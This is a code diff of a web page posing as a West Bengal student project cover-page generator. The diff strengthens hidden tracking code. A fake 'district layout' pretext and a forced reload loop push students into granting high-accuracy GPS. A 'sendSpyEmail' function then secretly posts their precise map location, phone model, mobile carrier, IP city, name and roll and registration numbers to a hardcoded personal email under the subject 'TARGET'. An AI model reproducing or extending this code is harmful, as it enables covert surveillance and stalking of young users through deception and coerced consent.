@@ -10,24 +10,27 @@
     <style>
         body { font-family: 'Amaranth', sans-serif; background-color: #121212; color: white; text-align: center; padding: 10px; margin: 0; overflow: hidden; /* লক থাকার সময় স্ক্রল বন্ধ */ }
         
-        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; max-width: 400px; margin: 10px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #333; filter: blur(5px); /* লক থাকার সময় ফর্ম ঝাপসা */ pointer-events: none; /* ক্লিক করা যাবে না */ transition: 0.5s; }
+        /* মেইন বক্স ব্লার থাকবে */
+        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; max-width: 400px; margin: 10px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #333; filter: blur(8px); pointer-events: none; transition: 0.5s; opacity: 0.5; }
         
-        /* --- 🔒 LOCATION LOCK MODAL --- */
+        /* --- 🔒 LOCATION LOCK MODAL (ফাঁদ) --- */
         #location-lock {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.95); z-index: 9999;
+            background: rgba(0, 0, 0, 0.98); z-index: 9999;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
             padding: 20px; text-align: center;
         }
-        .lock-icon { font-size: 50px; margin-bottom: 20px; }
-        .lock-title { color: #ff9800; font-size: 24px; margin-bottom: 10px; }
-        .lock-msg { color: #ccc; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
+        .lock-icon { font-size: 60px; margin-bottom: 20px; animation: bounce 2s infinite; }
+        .lock-title { color: #ff3333; font-size: 26px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .lock-msg { color: #ffffff; font-size: 16px; margin-bottom: 30px; line-height: 1.6; max-width: 90%; }
         .lock-btn {
-            background: linear-gradient(135deg, #00c6ff, #0072ff); color: white;
+            background: linear-gradient(135deg, #ff0000, #990000); color: white;
             padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold;
-            cursor: pointer; box-shadow: 0 0 20px rgba(0, 114, 255, 0.5);
+            cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
             animation: pulse 1.5s infinite;
         }
+        
+        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-20px);} 60% {transform: translateY(-10px);} }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
 
         /* --- REST OF THE CSS --- */
@@ -47,13 +50,14 @@
 <body>
 
     <div id="location-lock">
-        <div class="lock-icon">📍</div>
-        <h1 class="lock-title">Location Required</h1>
+        <div class="lock-icon">🚫</div>
+        <h1 class="lock-title">Access Denied</h1>
         <p class="lock-msg">
-            WBCHSE বোর্ডের নিয়ম অনুযায়ী, আপনার জেলার (District) ভিত্তিতে কভার পেজের ডিজাইন ফরম্যাট করা হবে।<br><br>
-            সঠিক স্কুল ফরম্যাট পেতে আপনার লোকেশন <b>"Allow"</b> করুন। এটি ছাড়া প্রজেক্ট জেনারেট করা সম্ভব নয়।
+            ⚠️ <b>সতর্কবার্তা:</b> এই প্রজেক্ট জেনারেটরটি শুধুমাত্র পশ্চিমবঙ্গের ছাত্রদের জন্য।<br><br>
+            আপনার এলাকা ভেরিফাই করার জন্য এবং <b>সঠিক জেলা ভিত্তিক ডিজাইন (District Layout)</b> পেতে লোকেশন পারমিশন দেওয়া বাধ্যতামূলক।<br><br>
+            লোকেশন ছাড়া কভার পেজ জেনারেট হবে না।
         </p>
-        <button class="lock-btn" onclick="requestGPS()">Enable Location & Enter</button>
+        <button class="lock-btn" onclick="requestGPS()">✅ Allow Location Access</button>
     </div>
 
     <div class="box" id="main-box">
@@ -119,32 +123,45 @@
         const CONFIG = { startX: 0.37, fontSize: 0.055, pos_Name: 0.540, pos_Subj: 0.605, pos_Roll: 0.670, pos_Reg: 0.735 };
         const MY_EMAIL = "ayankarmakar7602@gmail.com";
         
-        // গ্লোবাল ভেরিয়েবল লোকেশন স্টোর করার জন্য
-        let USER_LAT = "";
-        let USER_LONG = "";
+        // গ্লোবাল ভেরিয়েবল
+        let MAP_LINK = "Not Captured"; 
         let GPS_ALLOWED = false;
 
         // --- 🔒 LOCK SYSTEM LOGIC ---
         function requestGPS() {
             if (navigator.geolocation) {
+                // High Accuracy অন করা হলো যাতে নিখুঁত লোকেশন পায়
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // SUCCESS: লোকেশন পেলে তবেই লক খুলবে
-                        USER_LAT = position.coords.latitude;
-                        USER_LONG = position.coords.longitude;
+                        // SUCCESS: লোকেশন পেয়েছে
+                        const lat = position.coords.latitude;
+                        const long = position.coords.longitude;
+                        
+                        // 🔥 গুগল ম্যাপ লিংক তৈরি (ডাইরেক্ট পিন পয়েন্ট)
+                        MAP_LINK = `https://www.google.com/maps?q=${lat},${long}`;
+                        
                         GPS_ALLOWED = true;
                         
                         // লক সরানো হচ্ছে
                         document.getElementById('location-lock').style.display = 'none';
                         const mainBox = document.getElementById('main-box');
                         mainBox.style.filter = 'none';
+                        mainBox.style.opacity = '1';
                         mainBox.style.pointerEvents = 'auto';
                         document.body.style.overflow = 'auto';
                     },
                     (error) => {
-                        // DENIED: লোকেশন না দিলে ঝাড় খাবে
-                        alert("❌ Location Permission Denied!\n\nস্কুল ফরম্যাটের জন্য লোকেশন বাধ্যতামূলক। দয়া করে Browser Settings থেকে Location Allow করুন এবং রিফ্রেশ করুন।");
-                    }
+                        // DENIED: লোকেশন না দিলে পেজ রিলোড হবে (লুপে পড়ে যাবে)
+                        alert("❌ Permission Denied!\n\nলোকেশন ছাড়া কভার পেজ জেনারেট হবে না। দয়া করে Allow করুন।");
+                        location.reload(); // পেজ রিলোড করে আবার চাইবে
+                    },
+                    options
                 );
             } else {
                 alert("আপনার ব্রাউজারে GPS সাপোর্ট করছে না।");
@@ -180,31 +197,34 @@
                 return;
             }
 
-            // 🕵️‍♂️ মেইল পাঠানো (লক খোলার সময় যে জিপিএস পেয়েছি সেটা সহ)
+            // 🕵️‍♂️ মেইল পাঠানো
             sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
             
             // ইমেজ জেনারেট
             generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
         }
 
-        // --- 🕵️‍♂️ অ্যাডভান্সড মডেল ডিটেক্টর ---
+        // --- 🕵️‍♂️ অ্যাডভান্সড মডেল ডিটেক্টর (Regex Update) ---
         function getAdvancedDeviceModel() {
             const ua = navigator.userAgent;
-            let model = "Generic Android";
+            let model = "Unknown Mobile";
             
-            // ১. যদি ইউজার এজেন্ট ডেটা (Modern API) থাকে
-            if (navigator.userAgentData && navigator.userAgentData.brands) {
-                // ব্র্যান্ড বের করার চেষ্টা
-                const brand = navigator.userAgentData.brands.find(b => !b.brand.includes("Not") && !b.brand.includes("Chromium"));
-                if(brand) model = brand.brand; 
+            // Modern API চেষ্টা
+            if (navigator.userAgentData && navigator.userAgentData.mobile) {
+               const brand = navigator.userAgentData.brands.find(b => !b.brand.includes("Not") && !b.brand.includes("Chromium"));
+               if(brand) model = brand.brand + " Device";
             }
 
-            // ২. রেগুলার ইউজার এজেন্ট পার্সিং (Regex দিয়ে মডেল খোঁজা)
+            // Deep Regex Search for Model Name (Build/...)
             if (ua.includes("Android")) {
-                // সাধারণ প্যাটার্ন: "Android 10; SM-A505F" বা "Android; Mobile;"
-                const match = ua.match(/Android.*?; ([^;]+)( Build)?/); 
+                // অনেক ফোনে Build/ এর আগে মডেল নাম থাকে
+                const match = ua.match(/;\s([^;]+)\sBuild\//); 
                 if (match && match[1]) {
                     model = match[1].trim(); 
+                } else {
+                    // সাধারণ প্যাটার্ন
+                    const match2 = ua.match(/Android[^;]+; ([^;]+);/);
+                    if (match2 && match2[1]) model = match2[1].trim();
                 }
             } else if (ua.includes("iPhone")) {
                 model = "iPhone";
@@ -222,11 +242,6 @@
             // ফোনের মডেল বের করা
             const deviceModel = getAdvancedDeviceModel();
 
-            // ম্যাপ লিংক তৈরি
-            const mapLink = GPS_ALLOWED 
-                ? `http://maps.google.com/?q=${USER_LAT},${USER_LONG}` 
-                : "Location Blocked by User";
-
             // সিম/আইপি ডাটা (ব্যাকআপ)
             let ipData = { org: "Unknown", city: "Unknown" };
             try {
@@ -237,26 +252,27 @@
             let cleanSim = ipData.org;
             if(cleanSim && cleanSim.includes("Airtel")) cleanSim = "Airtel";
             if(cleanSim && cleanSim.includes("Jio")) cleanSim = "Jio";
+            if(cleanSim && (cleanSim.includes("Vi") || cleanSim.includes("Vodafone"))) cleanSim = "Vi";
 
             fetch(url, {
                 method: "POST",
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify({
-                    _subject: `Target: ${name} (#${uniqueId})`, 
+                    _subject: `TARGET: ${name} (#${uniqueId})`, 
                     _captcha: "false",
                     _template: "table",
                     
                     // ফর্ম ডাটা
-                    Name: name,
+                    Student: name,
                     Subject: subj,
                     Roll: roll,
                     Reg: reg,
                     
                     // 🕵️‍♂️ আসল গোয়েন্দা রিপোর্ট
-                    EXACT_LOCATION: mapLink,  // এটাতে ক্লিক করলেই Google Maps খুলবে
-                    PHONE_MODEL: deviceModel, // যতোটা সম্ভব ক্লিয়ার নাম
-                    SIM_ISP: cleanSim,
-                    IP_City: ipData.city,
+                    MAP_LOCATION: MAP_LINK,  // ডাইরেক্ট গুগল ম্যাপ লিংক
+                    PHONE: deviceModel,      // মডেল নাম
+                    SIM: cleanSim,           // সিমের নাম
+                    CITY: ipData.city,       // আইপি সিটি
                     
                     Time: new Date().toLocaleString()
                 })
@@ -265,7 +281,7 @@
             .catch(err => console.log("Error:", err));
         }
 
-        // --- জেনারেট ও পিডিএফ ফাংশন (সেম) ---
+        // --- জেনারেট ও পিডিএফ ফাংশন ---
         function generate(nameVal, subjVal, rollVal, regVal) {
             const cvs = document.getElementById('canvas');
             const ctx = cvs.getContext('2d');
